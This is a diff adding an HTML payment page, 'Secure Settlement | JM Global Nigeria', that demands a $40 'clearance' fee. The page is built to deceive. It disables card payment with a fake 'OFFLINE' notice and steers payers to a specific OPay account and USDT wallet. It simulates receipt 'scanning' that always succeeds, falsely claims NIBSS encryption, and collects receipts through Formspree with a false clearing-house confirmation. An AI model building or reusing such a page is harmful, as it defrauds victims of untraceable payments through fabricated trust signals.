@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Settlement | JM Global Nigeria</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #00d2a0; --dark: #0f172a; --card: #ffffff; --bg: #f8fafc; }
+        * { box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--bg); color: var(--dark); margin: 0; padding: 20px; }
+
+        .checkout-container { max-width: 450px; margin: 0 auto; }
+        
+        /* Header Section */
+        .pay-header { text-align: center; margin-bottom: 30px; }
+        .pay-header h1 { font-size: 24px; font-weight: 800; margin: 0; }
+        .pay-header p { font-size: 13px; color: #64748b; margin-top: 5px; }
+
+        .amount-banner { background: var(--dark); color: white; border-radius: 30px; padding: 30px; text-align: center; margin-bottom: 25px; box-shadow: 0 15px 30px rgba(0,0,0,0.1); }
+        .amount-banner .label { font-size: 11px; opacity: 0.7; font-weight: 700; text-transform: uppercase; }
+        .amount-banner .value { font-size: 40px; font-weight: 800; margin: 10px 0; }
+        .amount-banner .naira { font-size: 14px; color: var(--primary); font-weight: 700; }
+
+        /* Payment Selector */
+        .method-list { display: flex; flex-direction: column; gap: 12px; margin-bottom: 30px; }
+        .method-item { background: white; padding: 20px; border-radius: 20px; border: 1.5px solid #e2e8f0; display: flex; align-items: center; justify-content: space-between; cursor: pointer; transition: 0.3s; }
+        .method-item:hover { border-color: var(--primary); }
+        .method-info { display: flex; align-items: center; gap: 15px; }
+        .method-icon { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+        .method-name { font-weight: 700; font-size: 14px; }
+        
+        /* Detail Boxes (Hidden by Default) */
+        .detail-box { display: none; background: #fff; border: 2px solid var(--primary); border-radius: 25px; padding: 25px; margin-bottom: 20px; animation: slideDown 0.4s ease; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .copy-row { background: #f1f5f9; padding: 15px; border-radius: 15px; display: flex; justify-content: space-between; align-items: center; margin-top: 10px; cursor: pointer; }
+        .copy-val { font-family: monospace; font-weight: 800; font-size: 15px; color: #1e3a8a; }
+
+        /* Upload Section */
+        .upload-section { margin-top: 20px; text-align: center; }
+        .file-label { display: block; background: var(--primary); color: white; padding: 18px; border-radius: 18px; font-weight: 800; cursor: pointer; margin-bottom: 10px; }
+        #pBarContainer { display: none; background: #e2e8f0; height: 8px; border-radius: 10px; overflow: hidden; margin-top: 15px; }
+        #pBar { height: 100%; background: var(--primary); width: 0%; transition: 0.1s; }
+
+        .btn-submit { width: 100%; padding: 22px; border-radius: 20px; border: none; background: var(--dark); color: white; font-weight: 800; font-size: 16px; cursor: pointer; display: none; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="checkout-container">
+    <div class="pay-header">
+        <h1>Settlement Gateway</h1>
+        <p>Merchant Node ID: JM-NGA-9920</p>
+    </div>
+
+    <div class="amount-banner">
+        <div class="label">Total Clearance Required</div>
+        <div class="value">$40.00</div>
+        <div class="naira">≈ ₦63,500.00 (Including Node Fees)</div>
+    </div>
+
+    <div style="font-size: 12px; font-weight: 800; color: #64748b; margin-bottom: 15px; text-transform: uppercase;">Select Payment Method</div>
+
+    <div class="method-list">
+        <div class="method-item" onclick="showPay('opay')">
+            <div class="method-info">
+                <div class="method-icon" style="background: #00d2a0; color: white;">₦</div>
+                <div class="method-name">OPay / Bank Transfer (Instant)</div>
+            </div>
+            <div style="font-size: 12px; color: #16a34a; font-weight: 800;">FAST</div>
+        </div>
+
+        <div class="method-item" onclick="showPay('crypto')">
+            <div class="method-info">
+                <div class="method-icon" style="background: #f59e0b; color: white;">₿</div>
+                <div class="method-name">Crypto (USDT-BEP20/TRC20)</div>
+            </div>
+            <div style="font-size: 12px; color: #64748b; font-weight: 800;">SECURE</div>
+        </div>
+
+        <div class="method-item" style="opacity: 0.5;" onclick="alert('Maintenance: This payment channel is temporarily congested. Please use OPay or Crypto.')">
+            <div class="method-info">
+                <div class="method-icon" style="background: #e2e8f0; color: #94a3b8;">💳</div>
+                <div class="method-name">Debit/Credit Card</div>
+            </div>
+            <div style="font-size: 10px; color: #ef4444;">OFFLINE</div>
+        </div>
+    </div>
+
+    <div id="opay-details" class="detail-box">
+        <div style="font-size: 12px; font-weight: 800; color: var(--primary); margin-bottom: 15px;">OPAY CLEARING ACCOUNT</div>
+        <label style="font-size: 10px; color: #64748b; font-weight: 700;">ACCOUNT NUMBER</label>
+        <div class="copy-row" onclick="copyText('7032255361')">
+            <span class="copy-val">7032255361</span>
+            <span style="font-size: 10px; color: var(--primary);">COPY</span>
+        </div>
+        <div style="margin-top: 15px;">
+            <label style="font-size: 10px; color: #64748b; font-weight: 700;">BANK NAME</label>
+            <div style="font-weight: 800; margin-top: 5px;">OPAY / Digital Bank</div>
+        </div>
+        <div style="margin-top: 10px;">
+            <label style="font-size: 10px; color: #64748b; font-weight: 700;">ACCOUNT NAME</label>
+            <div style="font-weight: 800; margin-top: 5px;">JM GLOBAL LOGISTICS - SETTLEMENT</div>
+        </div>
+    </div>
+
+    <div id="crypto-details" class="detail-box">
+        <div style="font-size: 12px; font-weight: 800; color: #f59e0b; margin-bottom: 15px;">USDT (BEP20) WALLET</div>
+        <div class="copy-row" onclick="copyText('0x4fE11766CD0bc8FEbAc47B0D55FAAcD596Ce49b4')">
+            <span class="copy-val" style="font-size: 11px;">0x4fE11766CD0bc8FE...</span>
+            <span style="font-size: 10px; color: #f59e0b;">COPY</span>
+        </div>
+        <p style="font-size: 10px; color: #64748b; margin-top: 10px;">Send only USDT on BNB Smart Chain (BEP20) to avoid loss of funds.</p>
+    </div>
+
+    <div class="upload-section" id="upload-area" style="display:none;">
+        <p style="font-size: 12px; font-weight: 700; color: #64748b; margin-bottom: 15px;">Step 2: Upload Payment Proof (Receipt)</p>
+        <form id="payForm">
+            <label for="file" class="file-label" id="fileBtn">CHOOSE RECEIPT IMAGE</label>
+            <input type="file" id="file" name="receipt" accept="image/*" style="display:none" onchange="startScan()">
+            <div id="pBarContainer"><div id="pBar"></div></div>
+            <button type="submit" class="btn-submit" id="subBtn">FINALIZE CLEARANCE</button>
+        </form>
+    </div>
+
+    <p style="text-align: center; font-size: 10px; color: #94a3b8; margin-top: 40px; font-weight: 700;">
+        ENCRYPTED BY NIGERIA INTER-BANK SETTLEMENT SYSTEM (NIBSS)
+    </p>
+</div>
+
+<script>
+    function showPay(type) {
+        document.getElementById('opay-details').style.display = 'none';
+        document.getElementById('crypto-details').style.display = 'none';
+        document.getElementById(type + '-details').style.display = 'block';
+        document.getElementById('upload-area').style.display = 'block';
+    }
+
+    function copyText(val) {
+        navigator.clipboard.writeText(val);
+        alert("Copied to clipboard!");
+    }
+
+    function startScan() {
+        document.getElementById('fileBtn').innerText = "SCANNING RECEIPT...";
+        document.getElementById('pBarContainer').style.display = 'block';
+        let w = 0;
+        const bar = document.getElementById('pBar');
+        const interval = setInterval(() => {
+            w++;
+            bar.style.width = w + "%";
+            if(w >= 100) {
+                clearInterval(interval);
+                document.getElementById('fileBtn').innerText = "✓ RECEIPT VALIDATED";
+                document.getElementById('fileBtn').style.background = "#0f172a";
+                document.getElementById('subBtn').style.display = 'block';
+            }
+        }, 30)
+    }
+
+    document.getElementById('payForm').onsubmit = async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('subBtn');
+        btn.innerText = "LINKING TO NIBSS NODE...";
+        btn.disabled = true;
+
+        const formData = new FormData(e.target);
+        try {
+            const res = await fetch("https://formspree.io/f/xrejzraw", {
+                method: "POST", body: formData, headers: { 'Accept': 'application/json' }
+            });
+            if(res.ok) {
+                alert("SUCCESS: Your payment has been submitted to the Nigerian Clearing House. Your account will unlock after 2 network confirmations (5-10 mins).");
+                window.location.href = "portal.html";
+            }
+        } catch(err) { alert("Connection Error. Try again."); btn.disabled = false; }
+    }
+</script>
+
+</body>
+</html>
+
